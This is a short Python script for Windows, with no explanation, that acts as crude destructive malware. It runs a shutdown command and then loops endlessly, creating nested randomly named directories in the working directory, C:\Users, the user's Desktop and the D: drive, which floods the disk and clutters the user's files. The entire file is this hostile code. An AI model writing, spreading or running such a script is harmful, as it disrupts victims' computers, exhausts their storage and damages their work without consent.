from os import *
from getpass import *
from random import *
def Desktop():
    username = getuser()
    addres = "C:\\Users\\" + username + "\\Desktop" 
    return addres
addres_1 = getcwd()
addres_2 = "C:\\Users"
addres_3 = Desktop()
addres_4 = "D:\\"
name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
le = len(name) - 1
system("shutdown/s")
while True:
    rand_1 = randint(0,le)
    rand_2 = randint(0,le)
    rand_3 = randint(0,le)
    rand_4 = randint(0,le)
    rand_5 = randint(0,le)
    rand_6 = randint(0,le)
    rand_7 = randint(0,le)
    rand_8 = randint(0,le)
    direcory = name[rand_1] + name[rand_2] + name[rand_3] + name[rand_4] + name[rand_5] + name[rand_6] + name[rand_7] + name[rand_8]
    chdir(addres_1)
    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
    chdir(addres_2)
    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
    chdir(addres_3)
    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
    chdir(addres_4)
    system("mkdir {}\{}\{}\{}".format(direcory,direcory,direcory,direcory))
